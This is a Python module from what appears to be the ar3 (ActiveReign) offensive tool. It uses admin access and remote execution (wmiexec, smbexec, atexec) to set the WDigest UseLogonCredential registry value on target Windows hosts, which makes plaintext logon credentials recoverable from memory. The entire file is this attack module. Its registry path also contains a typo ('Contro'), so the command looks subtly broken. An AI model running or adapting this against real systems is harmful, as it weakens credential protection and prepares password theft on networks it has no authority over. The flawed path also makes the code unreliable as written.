from ar3.ops.enum.host_enum import ps_execution, code_execution

class Wdigest():
    def __init__(self):
        self.name           = 'WDigest'
        self.description    = 'Modify WDigest registry value'
        self.author         = ['@m8r0wn']
        self.requires_admin = True
        self.exec_methods   = ['wmiexec', 'smbexec', 'atexec']
        self.args = {
            'ACTION': {
                'Description': 'WDigest registry key action {enable / disable}',
                'Required': False,
                'Value': 'enable'
            }
        }

    def run(self, target, args, smb_con, loggers, config_obj):
        logger = loggers['console']

        # WDigest action
        if self.args['ACTION']['Value'].lower() == 'enable':
            reg_val = '1'
        elif self.args['ACTION']['Value'].lower() == 'disable':
            reg_val = '0'
        else:
            loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), "Invalid module arg, only {enable, disable} allowed"])
            return

        command = 'reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d {} /f'.format(reg_val)

        try:
            loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), "Setting WDigest registry key to \"{}\"".format(self.args['ACTION']['Value'])])
            x = code_execution(smb_con, args, target, loggers, config_obj, command, return_data=True)
            for line in x.splitlines():
                if line:
                    loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), line])
        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))
